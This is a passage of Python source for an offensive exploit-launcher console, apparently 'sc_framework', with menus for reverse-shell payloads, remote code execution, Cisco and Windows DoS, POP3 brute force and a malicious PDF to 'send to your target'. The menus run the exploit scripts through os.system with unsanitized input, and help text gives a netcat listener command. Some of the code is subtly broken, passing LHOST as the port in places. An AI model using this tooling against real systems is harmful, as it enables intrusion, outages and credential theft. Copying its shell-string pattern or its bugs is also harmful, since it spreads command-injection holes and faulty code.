    elif scconsole48 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def lexploitvulnerabilityfind():
    scconsole49 = input("sc~" + color.red + "(linux/vulnerability-find)" + color.white + ">")
    if scconsole49 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        lexploitvulnerabilityfind()
    elif scconsole49 == "clear":
        os.system('clear')
        lexploitvulnerabilityfind()
    elif scconsole49 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify the target ip address.

you will specifiy these options when you run or exploit it!
""")
        lexploitvulnerabilityfind()
    elif scconsole49 == "run":
        os.system('python exploits/linux/vulnerability-find.py')
        lexploitvulnerabilityfind()
    elif scconsole49 == "exploit":
        os.system('python exploits/linux/vulnerability-find.py')
        lexploitvulnerabilityfind()
    elif scconsole49 == "unuse":
        print("unusing linux/vulnerability-find.")
        time.sleep(0.5)
        Console()
    elif scconsole49 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def tcve202224521():
    scconsole50 = input("sc~" + color.red + "(site/cve-2022-24521)" + color.white + ">")
    if scconsole50 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        tcve202224521()
    elif scconsole50 == "clear":
        os.system('clear')
        tcve202224521()
    elif scconsole50 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify the target ip address(website IP Address).
LHOST            | specify the listening host.
LPORT            | specify yhe listening port.

run this command in another terminal after specifiying the options ---> """ + color.green + """nc -lvnp <port>""" + color.white + """
you will specifiy these options when you run or exploit it!
""")
        tcve202224521()
    elif scconsole50 == "run":
        rhost4 = input("RHOST: ")
        lhost4 = input("LHOST: ")
        lport4 = input("LPORT: ")
        os.system(f'python exploits/site/cve-2022-24521.py {rhost4} {lhost4} {lport4}')
        tcve202224521()
    elif scconsole50 == "exploit":
        rhost5 = input("RHOST: ")
        lhost5 = input("LHOST: ")
        lport5 = input("LPORT: ")
        os.system(f'python exploits/site/cve-2022-24521.py {rhost5} {lhost5} {lhost5}')
        tcve202224521()
    elif scconsole50 == "unuse":
        print("unusing site/cve-2022-24521.")
        time.sleep(0.5)
        Console()
    elif scconsole50 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def tinformationgather():
    scconsole51 = input("sc~" + color.red + "(site/information-gather)" + color.white + ">")
    if scconsole51 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        tinformationgather()
    elif scconsole51 == "clear":
        os.system('clear')
        tinformationgather()
    elif scconsole51 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url.

you will specifiy these options when you run or exploit it!
""")
        tinformationgather()
    elif scconsole51 == "run":
        os.system('python exploits/site/information-gather.py')
        tinformationgather()
    elif scconsole51 == "exploit":
        os.system('python exploits/site/information-gather.py')
        tinformationgather()
    elif scconsole51 == "unuse":
        print("unusing site/information-gather.")
        time.sleep(0.5)
        Console()
    elif scconsole51 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def tportscan():
    scconsole52 = input("sc~" + color.red + "(site/port-scan)" + color.white + ">")
    if scconsole52 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        tportscan()
    elif scconsole52 == "clear":
        os.system('clear')
        tportscan()
    elif scconsole52 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url.
START_PORT       | specify the starting port.
END_PORT         | specify the ending port.

you will specifiy these options when you run or exploit it!
""")
        tportscan()
    elif scconsole52 == "run":
        os.system('python exploits/site/port-scan.py')
        tportscan()
    elif scconsole52 == "exploit":
        os.system('python exploits/site/port-scan.py')
        tportscan()
    elif scconsole52 == "unuse":
        print("unusing site/port-scan.")
        time.sleep(0.5)
        Console()
    elif scconsole52 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def dciscodos():
    scconsole53 = input("sc~" + color.red + "(dos/ciscodos)" + color.white + ">")
    if scconsole53 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        dciscodos()
    elif scconsole53 == "clear":
        os.system('clear')
        dciscodos()
    elif scconsole53 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify the target ip address (Cisco IOS software router IP - Internetwork Operating System).
TTL              | specify the ttl (Time-to-Live).

you will specifiy these options when you run or exploit it!
""")
        dciscodos()
    elif scconsole53 == "run":
        routerip = input("IP: ")
        ttl = int(input("TTL: "))
        os.system(f'./exploits/dos/ciscodos.sh {routerip} {ttl}')
        dciscodos()
    elif scconsole53 == "exploit":
        routerip2 = input("IP: ")
        ttl2 = int(input("TTL: "))
        os.system(f'./exploits/dos/ciscodos.sh {routerip2} {ttl2}')
        dciscodos()
    elif scconsole53 == "unuse":
        print("unusing dos/ciscodos.sh.")
        time.sleep(0.5)
        Console()
    elif scconsole53 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def wMS04007LSASSexeProRemoteDoS():
    scconsole54 = input("sc~" + color.red + "(windows/MS04-007_LSASS-exe_Pro_Remote_DoS)" + color.white + ">")
    if scconsole54 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        wMS04007LSASSexeProRemoteDoS()
    elif scconsole54 == "clear":
        os.system('clear')
        wMS04007LSASSexeProRemoteDoS()
    elif scconsole54 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify the target ip address.
RPORT            | specify the port.
NETBIOS          | specify the netbios.

you will specifiy these options when you run or exploit it!
""")
        wMS04007LSASSexeProRemoteDoS()
    elif scconsole54 == "run":
        lhost54 = input("LHOST: ")
        lport54 = int(input("LPORT: "))
        netbios54 = input("NETBIOS: ")
        os.system(f'./exploits/windows/MS04-007_LSASS-exe_Pro_Remote_DoS {lhost54} {lport54} {netbios54}')
        wMS04007LSASSexeProRemoteDoS()
    elif scconsole54 == "exploit":
        lhost55 = input("LHOST: ")
        lport55 = int(input("LPORT: "))
        netbios55 = input("NETBIOS: ")
        os.system(f'./exploits/windows/MS04-007_LSASS-exe_Pro_Remote_DoS {lhost55} {lport55} {netbios55}')
        wMS04007LSASSexeProRemoteDoS()
    elif scconsole54 == "unuse":
        print("unusing windows/MS04-007_LSASS-exe_Pro_Remote_DoS.")
        time.sleep(0.5)
        Console()
    elif scconsole54 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def ltcpdumppacketsniffer():
    scconsole55 = input("sc~" + color.red + "(linux/tcpdump_packet_sniffer)" + color.white + ">")
    if scconsole55 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        ltcpdumppacketsniffer()
    elif scconsole55 == "clear":
        os.system('clear')
        ltcpdumppacketsniffer()
    elif scconsole55 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify the target ip address.

you will specifiy these options when you run or exploit it!
""")
        ltcpdumppacketsniffer()
    elif scconsole55 == "run":
        lhost56 = input("LHOST: ")
        os.system(f'./exploits/linux/tcpdump_packet_sniffer {lhost56}')
        ltcpdumppacketsniffer()
    elif scconsole55 == "exploit":
        lhost57 = input("LHOST: ")
        os.system(f'./exploits/linux/tcpdump_packet_sniffer {lhost57}')
        ltcpdumppacketsniffer()
    elif scconsole55 == "unuse":
        print("unusing linux/tcpdump_packet_sniffer.")
        time.sleep(0.5)
        Console()
    elif scconsole55 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def pRCEviaPHP():
    scconsole56 = input("sc~" + color.red + "(php/RCE_via_PHP)" + color.white + ">")
    if scconsole56 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        pRCEviaPHP()
    elif scconsole56 == "clear":
        os.system('clear')
        pRCEviaPHP()
    elif scconsole56 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify the target ip address (website).
RPORT         | specify the port.
COMMAND       | specify the command you want.

you will specifiy these options when you run or exploit it!
""")
        pRCEviaPHP()
    elif scconsole56 == "run":
        os.system('php exploits/php/RCE_via_PHP.php')
        pRCEviaPHP()
    elif scconsole56 == "exploit":
        os.system('php exploits/php/RCE_via_PHP.php')
        pRCEviaPHP()
    elif scconsole56 == "unuse":
        print("unusing php/RCE_via_PHP.")
        time.sleep(0.5)
        Console()
    elif scconsole56 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def pSOPlanning15201RCE():
    scconsole57 = input("sc~" + color.red + "(php/SOPlanning_1-52-01_RCE)" + color.white + ">")
    if scconsole57 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        pSOPlanning15201RCE()
    elif scconsole57 == "clear":
        os.system('clear')
        pSOPlanning15201RCE()
    elif scconsole57 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the target url (with port, example: https://example.com:9090).
USERNAME      | specify the username.
PASSWORD      | specify the password.

you will specifiy these options when you run or exploit it!
""")
        pSOPlanning15201RCE()
    elif scconsole57 == "run":
        url57 = input("URL: ")
        username57 = input("USERNAME: ")
        password57 = input("PASSWORD: ")
        os.system(f'python exploits/php/SOPlanning_1-52-01_RCE.py -t {url57} -u {username57} -p {password57}')
        pSOPlanning15201RCE()
    elif scconsole57 == "exploit":
        url58 = input("URL: ")
        username58 = input("USERNAME: ")
        password58 = input("PASSWORD: ")
        os.system(f'python exploits/php/SOPlanning_1-52-01_RCE.py -t {url58} -u {username58} -p {password58}')
        pSOPlanning15201RCE()
    elif scconsole57 == "unuse":
        print("unusing php/SOPlanning_1-52-01_RCE.")
        time.sleep(0.5)
        Console()
    elif scconsole57 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def mTyporav174():
    scconsole58 = input("sc~" + color.red + "(multi/Typora_v1-7-4)" + color.white + ">")
    if scconsole58 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        mTyporav174()
    elif scconsole58 == "clear":
        os.system('clear')
        mTyporav174()
    elif scconsole58 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specify your ip address.
LPORT            | specify your port.
PDF              | specify the PDF name.

The PDF file exploit will save in : /sc_framework/exploits/multi/[pdfname].pdf .

After Thats creates, Send the  PDF to your target!
you will specifiy these options when you run or exploit it!
""")
        mTyporav174()
    elif scconsole58 == "run":
        os.system('python exploits/multi/Typora_v1-7-4.py')
        mTyporav174()
    elif scconsole58 == "exploit":
        os.system('python exploits/multi/Typora_v1-7-4.py')
        mTyporav174()
    elif scconsole58 == "unuse":
        print("unusing multi/Typora_v1-7-4.")
        time.sleep(0.5)
        Console()
    elif scconsole58 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def pWp2Fac():
    scconsole59 = input("sc~" + color.red + "(php/Wp2Fac)" + color.white + ">")
    if scconsole59 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        pWp2Fac()
    elif scconsole59 == "clear":
        os.system('clear')
        pWp2Fac()
    elif scconsole59 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify the target ip address (website).
R-S-COMMAND   | specify the reverse-shell-command you want.

you will specifiy these options when you run or exploit it!
""")
        pWp2Fac()
    elif scconsole59 == "run":
        os.system('python exploits/php/Wp2Fac.py')
        pWp2Fac()
    elif scconsole59 == "exploit":
        os.system('python exploits/php/Wp2Fac.py')
        pWp2Fac()
    elif scconsole59 == "unuse":
        print("unusing php/Wp2Fac.")
        time.sleep(0.5)
        Console()
    elif scconsole59 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def mosdetector():
    scconsole60 = input("sc~" + color.red + "(multi/os_detector)" + color.white + ">")
    if scconsole60 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        mosdetector()
    elif scconsole60 == "clear":
        os.system('clear')
        mosdetector()
    elif scconsole60 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify target ip address.
PORT             | specify the port to start detecting.

you will specifiy these options when you run or exploit it!
""")
        mosdetector()
    elif scconsole60 == "run":
        targetip60 = input("LHOST: ")
        targetport60 = int(input("LPORT: "))
        os.system(f'sudo python exploits/multi/os_detector.py {targetip60} {targetport60}')
        mosdetector()
    elif scconsole60 == "exploit":
        targetip61 = input("LHOST: ")
        targetport61 = int(input("LPORT: "))
        os.system(f'sudo python exploits/multi/os_detector.py {targetip61} {targetport61}')
        mosdetector()
    elif scconsole60 == "unuse":
        print("unusing multi/os_detector.")
        time.sleep(0.5)
        Console()
    elif scconsole60 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def mpop3pass():
    scconsole61 = input("sc~" + color.red + "(multi/pop3-pass)" + color.white + ">")
    if scconsole61 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        mpop3pass()
    elif scconsole61 == "clear":
        os.system('clear')
        mpop3pass()
    elif scconsole61 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify the target ip address.
LPORT         | specified as 110 (pop3 port).

you will specifiy these options when you run or exploit it!
""")
        mpop3pass()
    elif scconsole61 == "run":
        os.system('python exploits/multi/pop3-pass.py')
        mpop3pass()
    elif scconsole61 == "exploit":
        os.system('python exploits/multi/pop3-pass.py')
        mpop3pass()
    elif scconsole61 == "unuse":
        print("unusing multi/pop3-pass.")
        time.sleep(0.5)
        Console()
    elif scconsole61 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def mpop3bruteforce():
    scconsole62 = input("sc~" + color.red + "(multi/pop3-brute-force)" + color.white + ">")
    if scconsole62 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        mpop3bruteforce()
    elif scconsole62 == "clear":
        os.system('clear')
        mpop3bruteforce()
    elif scconsole62 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify the target ip address.
PORT          | specified as 110 (pop3 port).
USERNAMELIST  | specify the username list path.
PASSWORDLIST  | specify the password list path.

you will specifiy these options when you run or exploit it!
""")
        mpop3bruteforce()
    elif scconsole62 == "run":
        os.system('python exploits/multi/pop3-brute-force.py')
        mpop3bruteforce()
    elif scconsole62 == "exploit":
        os.system('python exploits/multi/pop3-brute-force.py')
        mpop3bruteforce()
    elif scconsole62 == "unuse":
        print("unusing multi/pop3-brute-force.")
        time.sleep(0.5)
        Console()
    elif scconsole62 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def aauxiliaryrobotstxt():
    scconsole63 = input("sc~" + color.red + "(auxiliary/robots_txt)" + color.white + ">")
    if scconsole63 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliaryrobotstxt()
    elif scconsole63 == "clear":
        os.system('clear')
        aauxiliaryrobotstxt()
    elif scconsole63 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.

you will specifiy these options when you run or exploit it!
""")
        aauxiliaryrobotstxt()
    elif scconsole63 == "run":
        os.system('python exploits/auxiliary/robots_txt.py')
        aauxiliaryrobotstxt()
    elif scconsole63 == "exploit":
        os.system('python exploits/auxiliary/robots_txt.py')
        aauxiliaryrobotstxt()
    elif scconsole63 == "unuse":
        print("unusing auxiliary/robots_txt.")
        time.sleep(0.5)
        Console()
    elif scconsole63 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def aauxiliarydirsbrute():
    scconsole64 = input("sc~" + color.red + "(auxiliary/dirs_brute)" + color.white + ">")
    if scconsole64 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliarydirsbrute()
    elif scconsole64 == "clear":
        os.system('clear')
        aauxiliarydirsbrute()
    elif scconsole64 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.
WORDLIST_PATH | specify the url-list path.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarydirsbrute()
    elif scconsole64 == "run":
        os.system('python exploits/auxiliary/dirs_brute.py')
        aauxiliarydirsbrute()
    elif scconsole64 == "exploit":
        os.system('python exploits/auxiliary/dirs_brute.py')
        aauxiliarydirsbrute()
    elif scconsole64 == "unuse":
        print("unusing auxiliary/dirs_brute.")
        time.sleep(0.5)
        Console()
    elif scconsole64 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def aauxiliaryhttpversion():
    scconsole65 = input("sc~" + color.red + "(auxiliary/http-version)" + color.white + ">")
    if scconsole65 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliaryhttpversion()
    elif scconsole65 == "clear":
        os.system('clear')
        aauxiliaryhttpversion()
    elif scconsole65 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.

you will specifiy these options when you run or exploit it!
""")
        aauxiliaryhttpversion()
    elif scconsole65 == "run":
        os.system('python exploits/auxiliary/http-version.py')
        aauxiliaryhttpversion()
    elif scconsole65 == "exploit":
        os.system('python exploits/auxiliary/http-version.py')
        aauxiliaryhttpversion()
    elif scconsole65 == "unuse":
        print("unusing auxiliary/http-version.")
        time.sleep(0.5)
        Console()
    elif scconsole65 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def aauxiliaryenumapacheuser():
    scconsole66 = input("sc~" + color.red + "(auxiliary/enum_apache_user)" + color.white + ">")
    if scconsole66 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliaryenumapacheuser()
    elif scconsole66 == "clear":
        os.system('clear')
        aauxiliaryenumapacheuser()
    elif scconsole66 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.
USERNAMELIST  | specify the username list.

you will specifiy these options when you run or exploit it!
""")
        aauxiliaryenumapacheuser()
    elif scconsole66 == "run":
        os.system('python exploits/auxiliary/enum_apache_user.py')
        aauxiliaryenumapacheuser()
    elif scconsole66 == "exploit":
        os.system('python exploits/auxiliary/enum_apache_user.py')
        aauxiliaryenumapacheuser()
    elif scconsole66 == "unuse":
        print("unusing auxiliary/enum_apache_user.")
        time.sleep(0.5)
        Console()
    elif scconsole66 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def aauxiliaryvulnscan():
    scconsole67 = input("sc~" + color.red + "(auxiliary/vuln-scan)" + color.white + ">")
    if scconsole67 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliaryvulnscan()
    elif scconsole67 == "clear":
        os.system('clear')
        aauxiliaryvulnscan()
    elif scconsole67 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.

you will specifiy these options when you run or exploit it!
""")
        aauxiliaryvulnscan()
    elif scconsole67 == "run":
        os.system('python exploits/auxiliary/vuln-scan.py')
        aauxiliaryvulnscan()
    elif scconsole67 == "exploit":
        os.system('python exploits/auxiliary/vuln-scan.py')
        aauxiliaryvulnscan()
    elif scconsole67 == "unuse":
        print("unusing auxiliary/vuln-scan.")
        time.sleep(0.5)
        Console()
    elif scconsole67 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def aauxiliarysmtpversion():
    scconsole68 = input("sc~" + color.red + "(auxiliary/smtp-version)" + color.white + ">")
    if scconsole68 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliarysmtpversion()
    elif scconsole68 == "clear":
        os.system('clear')
        aauxiliarysmtpversion()
    elif scconsole68 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarysmtpversion()
    elif scconsole68 == "run":
        os.system('python exploits/auxiliary/smtp-version.py')
        aauxiliarysmtpversion()
    elif scconsole68 == "exploit":
        os.system('python exploits/auxiliary/smtp-version.py')
        aauxiliarysmtpversion()
    elif scconsole68 == "unuse":
        print("unusing auxiliary/smtp-version.")
        time.sleep(0.5)
        Console()
    elif scconsole68 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def wshellstorm():
    scconsole69 = input("sc~" + color.red + "(windows/shell-storm)" + color.white + ">")
    if scconsole69 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
show payloads ---> to show the payloads can used in this exploit.
use <payload> ---> to use a payload.
""")
        wshellstorm()
    elif scconsole69 == "clear":
        os.system('clear')
        wshellstorm()
    elif scconsole69 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify the target ip address.
RPORT         | specify the target port.
LHOST         | specify your ip for listener.
LPORT         | specify port for listener.

you will specifiy these options when you run or exploit it!
""")
        wshellstorm()
    elif scconsole69 == "show payloads":
        print("""
""" + color.green + """shell_reverse_tcp""" + color.white + """ ---> trys to get a reverse shell from target.
""")
        wshellstorm()
    elif scconsole69 == "use shell_reverse_tcp":
        print("using shell_reverse_tcp")
        wshellstorm2()
    elif scconsole69 == "run":
        os.system('python exploits/windows/shell-storm.py')
        wshellstorm()
    elif scconsole69 == "exploit":
        os.system('python exploits/windows/shell-storm.py')
        wshellstorm()
    elif scconsole69 == "unuse":
        print("unusing windows/shell-storm.")
        time.sleep(0.5)
        Console()
    elif scconsole69 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def wshellstorm2():
    scconsole74 = input("sc~" + color.red + color.underline + "(windows/shell-storm)" + color.white + ">")
    if scconsole74 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        wshellstorm2()
    elif scconsole74 == "clear":
        os.system('clear')
        wshellstorm2()
    elif scconsole74 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify the target ip address.
RPORT         | specify the target port.

PAYLOAD    ---> shell_reverse_tcp

you will specifiy these options when you run or exploit it!
""")
        wshellstorm2()
    elif scconsole74 == "run":
        os.system('python payloads/shell_reverse_tcp.py')
        wshellstorm2()
    elif scconsole74 == "exploit":
        os.system('python payloads/shell_reverse_tcp.py')
        wshellstorm2()
    elif scconsole74 == "unuse":
        print("unusing " + color.underline + "windows/shell-storm.")
        time.sleep(0.5)
        wshellstorm()
    elif scconsole74 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def aauxiliarytitle():
    scconsole70 = input("sc~" + color.red + "(auxiliary/title)" + color.white + ">")
    if scconsole70 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliarytitle()
    elif scconsole70 == "clear":
        os.system('clear')
        aauxiliarytitle()
    elif scconsole70 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarytitle()
    elif scconsole70 == "run":
        os.system('python exploits/auxiliary/title.py')
        aauxiliarytitle()
    elif scconsole70 == "exploit":
        os.system('python exploits/auxiliary/title.py')
        aauxiliarytitle()
    elif scconsole70 == "unuse":
        print("unusing auxiliary/title.")
        time.sleep(0.5)
        Console()
    elif scconsole70 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def aauxiliarywordpressscan():
    scconsole71 = input("sc~" + color.red + "(auxiliary/wordpress-scan)" + color.white + ">")
    if scconsole71 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliarywordpressscan()
    elif scconsole71 == "clear":
        os.system('clear')
        aauxiliarywordpressscan()
    elif scconsole71 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarywordpressscan()
    elif scconsole71 == "run":
        os.system('python exploits/auxiliary/wordpress-scan.py')
        aauxiliarywordpressscan()
    elif scconsole71 == "exploit":
        os.system('python exploits/auxiliary/wordpress-scan.py')
        aauxiliarywordpressscan()
    elif scconsole71 == "unuse":
        print("unusing auxiliary/wordpress-scan.")
        time.sleep(0.5)
        Console()
    elif scconsole71 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def aauxiliarywordpressvuln():
    scconsole72 = input("sc~" + color.red + "(auxiliary/wordpress-vuln)" + color.white + ">")
    if scconsole72 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliarywordpressvuln()
    elif scconsole72 == "clear":
        os.system('clear')
        aauxiliarywordpressvuln()
    elif scconsole72 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarywordpressvuln()
    elif scconsole72 == "run":
        os.system('python exploits/auxiliary/wordpress-vuln.py')
        aauxiliarywordpressvuln()
    elif scconsole72 == "exploit":
        os.system('python exploits/auxiliary/wordpress-vuln.py')
        aauxiliarywordpressvuln()
    elif scconsole72 == "unuse":
        print("unusing auxiliary/wordpress-vuln.")
        time.sleep(0.5)
        Console()
    elif scconsole72 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

